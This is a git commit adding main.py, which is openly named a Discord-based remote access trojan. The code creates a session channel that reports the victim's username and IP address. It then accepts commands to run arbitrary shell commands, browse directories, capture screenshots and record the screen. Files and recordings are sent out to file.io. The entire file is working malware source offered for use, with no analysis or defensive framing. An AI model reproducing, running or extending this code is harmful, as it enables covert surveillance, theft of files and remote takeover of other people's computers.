c87bb4c8a8b73b3bc08d2d5e4a6c8044d065bd02
Snikker <99515656+Snikkertjuh@users.noreply.github.com>
2022-02-12 21:50:47 +0100

    Create main.py

---
+++ main.py
@@ -0,0 +1,108 @@
+# Snikkertjuh/Discord-RAT Version 1.0.0
+
+import discord, os, pyautogui, requests, cv2, numpy, time
+
+token = ""
+client = discord.Bot(intents=discord.Intents.all())
+guildid = []
+
+@client.event
+async def on_ready():
+    global channel
+    channel = await client.guilds[0].create_text_channel(f"session-{os.getenv('username')}")
+    embed = discord.Embed(title="New Session Created", color=0x660cf)
+    embed.add_field(name="Username", value=f"```{os.getenv('username')}```")
+    embed.add_field(name="IP Address", value=f"```{requests.get('https://api.ipify.org').text}```")
+    await channel.send("@everyone", embed=embed)
+
+    global channelid
+    channelid = channel.id
+
+@client.slash_command(name="killall", guild_ids=guildid)
+async def killall(ctx):
+    if ctx.channel.id == channel.id:
+        embed = discord.Embed(title="Command Executed", description="```Killing Sessions..```", color=0x660cf)
+        await ctx.respond(embed=embed)
+        for channel in client.guilds[0].channels:
+            try: await channel.delete()
+            except Exception: pass 
+        os._exit(0)
+
+@client.slash_command(name="kill", guild_ids=guildid)
+async def kill(ctx):
+    if ctx.channel.id == channel.id:
+        embed = discord.Embed(title="Command Executed", description="```Killing Session..```", color=0x660cf)
+        await ctx.respond(embed=embed)
+        await channel.delete()
+        os._exit(0)
+
+@client.slash_command(name="cd", guild_ids=guildid)
+async def cd(ctx, directory):
+    if ctx.channel.id == channel.id:
+        try:
+            os.chdir(directory)
+            embed = discord.Embed(title="Command Executed", description=f"```New Directory:\n{directory}```", color=0x660cf)
+            await ctx.respond(embed=embed)
+        except Exception as error:
+            embed = discord.Embed(title="Something went wrong", description=f"```{error}```", color=0x660cf)
+            await ctx.respond(embed=embed)
+
+@client.slash_command(name="list", guild_ids=guildid)
+async def list(ctx):
+    if ctx.channel.id == channel.id:
+        os.system(f'dir /d > "{os.getenv("TEMP")}\\output.txt"')
+        list = open(f"{os.getenv('TEMP')}\\output.txt", "r").read()
+        embed = discord.Embed(title="Command Executed", description=f"```{list}```", color=0x660cf)
+        await ctx.respond(embed=embed)
+        os.remove(f"{os.getenv('TEMP')}\\output.txt")
+
+@client.slash_command(name="screenshot", guild_ids=guildid)
+async def screenshot(ctx):
+    if ctx.channel.id == channel.id:
+        embed = discord.Embed(title="Screenshot Captured", color=0x660cf)
+        embed.set_image(url="attachment://screenshot.png")
+        pyautogui.screenshot(f"{os.getenv('TEMP')}\\screenshot.png")
+        screenshot = discord.File(f"{os.getenv('TEMP')}\\screenshot.png")
+        await ctx.respond(file=screenshot, embed=embed)
+        os.remove(f"{os.getenv('TEMP')}\\screenshot.png")
+
+@client.slash_command(name="download", guild_ids=guildid)
+async def download(ctx, file):
+    if ctx.channel.id == channel.id:
+        embed = discord.Embed(title="Downloading File..", color=0x660cf)
+        await ctx.respond(embed=embed)
+        link = requests.post("https://file.io/", files={"file": open(file, "rb")}).json()["link"]
+        embed = discord.Embed(title="Downloaded File", description=f"{link}", color=0x660cf)
+        await ctx.respond(embed=embed)
+
+@client.slash_command(name="shell", guild_ids=guildid)
+async def shell(ctx, command):
+    if ctx.channel.id == channel.id:
+        try:
+            os.system(f'{command} > "{os.getenv("TEMP")}\\shell.txt"')
+            list = open(f"{os.getenv('TEMP')}\\shell.txt", "r").read()
+            embed = discord.Embed(title="Command Executed", description=f"```{list}```", color=0x660cf)
+            await ctx.respond(embed=embed)
+            os.remove(f"{os.getenv('TEMP')}\\shell.txt")
+        except Exception as error:
+            embed = discord.Embed(title="Something went wrong", description=f"```{error}```", color=0x660cf)
+            await ctx.respond(embed=embed)
+
+@client.slash_command(name="record", guild_ids=guildid)
+async def record(ctx, duration):
+    if ctx.channel.id == channel.id:
+        embed = discord.Embed(title="Recording Started", description=f"```Recording for {duration} seconds```", color=0x660cf)
+        await ctx.respond(embed=embed)
+        out = cv2.VideoWriter(f"{os.getenv('TEMP')}\\output.mp4", cv2.VideoWriter_fourcc(*"H264"), 30, (tuple(pyautogui.size())))
+        for i in range(int(duration) * 30):
+            img = pyautogui.screenshot()
+            frame = numpy.array(img)
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            out.write(frame)
+        out.release()
+        link = requests.post('https://file.io/', files={"file": open(f"{os.getenv('TEMP')}\\output.mp4", "rb")}).json()["link"]
+        embed = discord.Embed(title="Recording Stopped", description=f"{link}", color=0x660cf)
+        await ctx.send(embed=embed)
+        os.remove(f"{os.getenv('TEMP')}\\output.mp4")
+
+client.run(token)
